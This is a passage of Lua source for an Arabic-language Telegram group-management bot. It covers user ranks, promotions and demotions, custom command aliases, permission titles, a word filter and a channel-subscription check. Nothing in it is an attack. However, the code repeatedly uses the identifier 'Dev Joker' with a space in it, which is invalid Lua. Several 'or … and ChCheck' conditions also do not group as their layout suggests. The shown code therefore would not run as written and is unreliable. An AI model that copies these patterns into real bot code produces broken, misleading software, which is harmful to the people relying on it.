local id_rank = function(msg) if tonumber(msg.sender_user_id_) == tonumber(1765160742) then ABS_PROX = 'مبرمج السورس' elseif is_leader(msg) then ABS_PROX = 'المطور الاساسي' elseif is_SudoBot(msg.sender_user_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت' elseif is_ownerall(msg.sender_user_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'المدير العام' elseif is_adminall(msg.sender_user_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'الادمن العام' elseif is_vipall(msg.sender_user_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'المميز العام' elseif is_absmonsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = 'منشئ المجموعة' elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:monsh:Rd"..msg.chat_id_) or 'المنشئ الاساسي' elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:monshid:Rd"..msg.chat_id_) or 'المنشئ' elseif is_owner(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'المدير' elseif is_admin(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'الادمن' elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then ABS_PROX = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'عضو مميز' else ABS_PROX = DevAbs:get(Dev Joker.."abs:mem:Rd"..msg.chat_id_) or 'فقط عضو' end return ABS_PROX end
function rank_abs(user_id,chat_id) if tonumber(user_id) == tonumber(1765160742) then ABS_PROX  = "المبرمج" elseif is_leaderid(user_id) then ABS_PROX  = "المطور" elseif is_sudoid(user_id) then ABS_PROX = "المطور" elseif is_SudoBot(user_id) then ABS_PROX = "المطور" elseif is_ownerall(user_id) then ABS_PROX = "المدير" elseif is_adminall(user_id) then ABS_PROX = "الادمن" elseif is_absmonsh(user_id, chat_id) then ABS_PROX = "المنشئ" elseif is_monsh(user_id, chat_id) then ABS_PROX = "المنشئ" elseif is_monshid(user_id, chat_id) then ABS_PROX = "المنشئ" elseif is_owner(user_id, chat_id) then ABS_PROX = "المدير" elseif is_admin(user_id, chat_id) then ABS_PROX = "الادمن" else ABS_PROX = "العضو" end return ABS_PROX end
--     Source Joker     --
--       Set SudoBot        --
function setSudoBot(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المطورين', 1, 'md')
end
end 
--     Source Joker     --
--       Del SudoBot        --
function delSudoBot(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المطور ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المطورين', 1, 'md')
end
end
--     Source Joker     --
--       Set ownerall        --
function setownerall(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المدراء العامين', 1, 'md')
end
end
--     Source Joker     --
--       Del ownerall        -- 
function delownerall(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المدير العام ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المدراء العامين', 1, 'md')
end
end
--     Source Joker     --
--       Set adminall        -- 
function setadminall(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة الادمنية العامين', 1, 'md')
end
end
--     Source Joker     --
--       Del adminall        -- 
function deladminall(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الادمن العام ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة الادمنية العامين', 1, 'md')
end
end
--     Source Joker     --
--       Set Vipall       -- 
function setvipall(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المميزين العام', 1, 'md')
end
end
--     Source Joker     --
--       Del Vipall       -- 
function delvipall(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المميز العام ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المميزين العام', 1, 'md')
end
end
--     Source Joker     --
--       Set Monsh        -- 
function setmonsh(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه منشئ اساسي', 1, 'md')
end
end
--     Source Joker     --
--       Del Monsh        --
function delmonsh(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المنشئ الاساسي ↫ ['..absc9..']\n⌁︙تم تنزيله منشئ اساسي', 1, 'md')
end
end
--     Source Joker     --
--       Set monshid       -- 
function setmonshid(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المنشئين', 1, 'md')
end
end
--     Source Joker     --
--       Del monshid       -- 
function delmonshid(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المنشئ ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المنشئين', 1, 'md')
end
end
--     Source Joker     --
--       Set Owner        -- 
function setowner(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المدراء', 1, 'md')
end
end
--     Source Joker     --
--       Del Owner        -- 
function delowner(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المدير ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المدراء', 1, 'md')
end
end
--     Source Joker     --
--       Set admins        -- 
function setadmins(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة الادمنية', 1, 'md')
end
end
--     Source Joker     --
--       Del admins        -- 
function deladmins(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الادمن ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة الادمنية', 1, 'md')
end
end
--     Source Joker     --
--       Set Vipmem       -- 
function setvipmem(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المميزين', 1, 'md')
end
end
--     Source Joker     --
--       Del Vipmem       -- 
function delvipmem(msg,chat,user)
local user_info_ = DevAbs:get(Dev Joker..'user:Name' .. user)
local absc9 = user_info_ if user_info_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المميز ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المميزين', 1, 'md')
end
end
--     Source Joker     --
function absmasco(user_id,chat_id)
if is_leaderid(user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:SudoBot:', user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:ownerall:', user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:adminall:', user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:vipall:', user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:absmonsh:'..chat_id, user_id) then
var = true
elseif DevAbs:sismember(Dev Joker..'abs:monsh:'..chat_id, user_id) then
var = true
elseif is_monsh(chat_id, user_id) then
var = true
elseif DevAbs:sismember(Dev Joker..'abs:monshid:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:owners:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:admins:'..chat_id, user_id) then
var = true  
elseif DevAbs:sismember(Dev Joker..'abs:vipmem:'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end
function masco(user_id,chat_id)
if is_leaderid(user_id) then
var = 'botow'  
elseif DevAbs:sismember(Dev Joker..'abs:SudoBot:', user_id) then
var = 'SudoBot'  
elseif DevAbs:sismember(Dev Joker..'abs:absmonsh:'..chat_id, user_id) then
var = 'absmonsh'
elseif DevAbs:sismember(Dev Joker..'abs:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif DevAbs:sismember(Dev Joker..'abs:monshid:'..chat_id, user_id) then
var = 'monshid'
elseif DevAbs:sismember(Dev Joker..'abs:owners:'..chat_id, user_id) then
var = 'owner'  
else  
var = 'No'
end  
return var
end 
--     Source Joker     --
local function check_filter_words(msg, value)
local abs = (Dev Joker..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_admin(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
--     Source Joker     --
local getChat = function(chat_id, cb)
tdcli_function({ID = "GetChat", chat_id_ = chat_id}, cb or dl_cb, nil)
end
--     Source Joker     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageAudio",
audio_ = getInputFile(audio),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgg(msgs) 
local ABS_PROX = ''  
if msgs < 100 then 
ABS_PROX = 'جدا ضعيف' 
elseif msgs < 250 then 
ABS_PROX = 'ضعيف' 
elseif msgs < 500 then 
ABS_PROX = 'غير متفاعل' 
elseif msgs < 750 then 
ABS_PROX = 'متوسط' 
elseif msgs < 1000 then 
ABS_PROX = 'متفاعل' 
elseif msgs < 2000 then 
ABS_PROX = 'قمة التفاعل' 
elseif msgs < 3000 then 
ABS_PROX = 'ملك التفاعل'  
elseif msgs < 4000 then 
ABS_PROX = 'اسطورة التفاعل' 
elseif msgs < 5000 then 
ABS_PROX = 'متفاعل نار' 
elseif msgs < 5500 then 
ABS_PROX = 'يجدح جدح' 
elseif msgs < 6000 then 
ABS_PROX = 'خيالي' 
elseif msgs < 7000 then 
ABS_PROX = 'رب التفاعل' 
elseif msgs < 8000 then 
ABS_PROX = 'كافر بالتفاعل' 
elseif msgs < 9000 then 
ABS_PROX = "معلك لربك" 
end 
return ABS_PROX
end
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
DevAbs:set(Dev Joker..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return DevAbs:get(Dev Joker..'bot:group:name'..GroupID)  end
--     Source Joker     --
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(Dev Joker..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Joker     --
function ChCheck(msg)
local var = true 
if DevAbs:get(Dev Joker.."DevAbs2") then
local channel = ''..DevAbs:get(Dev Joker..'DevAbs3')..''
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbs:get(Dev Joker..'bot:textch:user') then
local textchuser = DevAbs:get(Dev Joker..'bot:textch:user')
Dev_Abs(msg.chat_id_, msg.id_, 1, '['..textchuser..']', 1, 'md')
else
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙عليك الاشتراك في قناة البوت \n⌁︙قناة البوت ↫ "..channel, 1 , "html")
end
elseif data.ok then
return var
end
else
return var
end
end

function tdcli_update_callback(data)
local our_id = DevAbs:get(Dev Joker.."Our_ID") or 0
local api_id = DevAbs:get(Dev Joker.."Bot:Api_ID") or 0
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
text = data.message_.content_.text_
if text and DevAbs:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevAbs:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الامر مِن المجموعة", 1, 'html')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد امر بِهذا الاسم", 1, 'html')
end
DevAbs:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if data.message_.content_.text_ then
local NewCmmd = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end

if text and DevAbs:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevAbs:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الجديد", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevAbs:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevAbs:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevAbs:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
DevAbs:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevAbs:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر", 1, 'html')
DevAbs:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "⌁︙قائمة الاوامر المضافة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
Cmds = DevAbs:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."⌯ ("..v..") • {"..Cmds.."}\n"
else
t = t..""..k.."⌯ ("..v..") \n"
end
end
if #list == 0 then
t = "⌁︙لايوجد اوامر مضافة في المجموعة"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local list = DevAbs:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevAbs:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الاوامر المضافة في المجموعة", 1, 'html')
end
if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
DevAbs:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
DevAbs:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الذي قمت باضافتة يدويا", 1, 'html')
return false
end
end
--     Source Joker     --
if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "⌁︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
var = DevAbs:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."⌯ "..v.." • ("..var..")\n"
else
t = t..""..k.."⌯ "..v.."\n"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local list = DevAbs:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
DevAbs:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
DevAbs:del(bot_id.."Coomds"..msg.chat_id_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevAbs:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevAbs:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
DevAbs:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌁︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevAbs:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيه", 1, 'html')
end
if DevAbs:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو • مميز )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تستطيع اضافة صلاحية ( عضو )\n⌁︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevAbs:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevAbs:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة الصلاحيه", 1, 'html')
DevAbs:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
local DEV_ABBAS = text:match("رفع (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
DevAbs:sadd(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "ادمن" and is_admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "مدير" and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
DevAbs:sadd(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
local DEV_ABBAS = text:match("تنزيل (.*)")
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,DEV_ABBAS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..DEV_ABBAS..msg.chat_id_)
if mrabs == "مميز" and is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and is_admin(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم تنزيلة ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") and ChCheck(msg) then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:sadd(Dev Joker..'abs:vipmem:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
